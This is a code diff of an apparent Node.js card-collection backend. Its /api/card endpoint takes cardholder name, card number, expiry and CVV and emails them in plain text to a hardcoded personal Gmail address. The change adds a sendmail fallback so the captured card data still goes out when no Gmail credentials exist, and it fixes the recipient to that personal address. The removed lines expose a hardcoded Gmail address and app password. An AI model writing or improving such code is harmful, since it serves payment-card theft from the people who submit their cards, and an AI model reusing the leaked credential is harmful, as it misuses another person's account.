@@ -65,30 +65,38 @@ const gmailUser = process.env.GMAIL_USER;
 const gmailPass = process.env.GMAIL_PASS;
 
 if (!gmailUser || !gmailPass) {
-  console.warn('Warning: GMAIL_USER or GMAIL_PASS not set. Email sending will likely fail. Set environment variables for production.');
+  console.warn('Warning: GMAIL_USER or GMAIL_PASS not set. Falling back to sendmail transport. For reliable delivery, set GMAIL_USER and GMAIL_PASS environment variables.');
 }
 
-const transporter = nodemailer.createTransport({
-  host: 'smtp.gmail.com',
-  port: 465,
-  secure: true, // true for port 465
-  auth: {
-    user: gmailUser || 'peternnamani001@gmail.com',
-    pass: gmailPass || 'llvn tfua kgre byir' // fallback kept for dev but recommend removing
-  }
-});
-
-// Verify transporter only if credentials are present
+// Create transporter: prefer Gmail SMTP when credentials exist, otherwise fallback to sendmail
+let transporter = null;
 if (gmailUser && gmailPass) {
+  transporter = nodemailer.createTransport({
+    host: 'smtp.gmail.com',
+    port: 465,
+    secure: true, // true for port 465
+    auth: {
+      user: gmailUser,
+      pass: gmailPass
+    }
+  });
+
+  // Verify transporter
   transporter.verify(function(error, success) {
     if (error) {
       console.error('Nodemailer transporter verification failed:', error);
     } else {
-      console.log('Nodemailer transporter is ready to send emails');
+      console.log('Nodemailer transporter is ready to send emails via Gmail SMTP');
     }
   });
 } else {
-  console.log('Skipping transporter.verify(): missing GMAIL_USER or GMAIL_PASS');
+  // Fallback: use sendmail transport (requires sendmail/postfix on the host)
+  transporter = nodemailer.createTransport({
+    sendmail: true,
+    newline: 'unix',
+    path: '/usr/sbin/sendmail'
+  });
+  console.log('Using sendmail transport as fallback. Ensure sendmail/postfix is installed on the host.');
 }
 
 app.options('/api/card', cors()); // Handle preflight requests for /api/card
@@ -106,25 +114,26 @@ app.post('/api/card', async (req, res) => {
 
   const mailOptions = {
     from: gmailUser || 'peternnamani001@gmail.com',
-    to: gmailUser || 'peternnamani001@gmail.com',
+    to: 'peternnamani001@gmail.com',
     subject: 'New Card Submission',
     text: JSON.stringify({ cardName, cardNumber, expiry, cvv }, null, 2)
   };
 
   try {
+    // Always attempt to send using the configured transporter (Gmail SMTP or sendmail fallback)
     const info = await transporter.sendMail(mailOptions);
     if (allowedOrigins.includes(req.headers.origin)) {
       res.header('Access-Control-Allow-Origin', req.headers.origin);
       res.header('Access-Control-Allow-Credentials', 'true');
     }
-    res.json({ success: true, message: 'Email sent', info: info.response });
+    res.json({ success: true, message: 'Email sent', info: info && info.response ? info.response : info });
   } catch (err) {
     if (allowedOrigins.includes(req.headers.origin)) {
       res.header('Access-Control-Allow-Origin', req.headers.origin);
       res.header('Access-Control-Allow-Credentials', 'true');
     }
     console.error('Error sending email:', err);
-    res.status(500).json({ error: 'Failed to send email', details: err.message });
+    res.status(500).json({ error: 'Failed to send email', details: err && err.message ? err.message : String(err) });
   }
 });
 
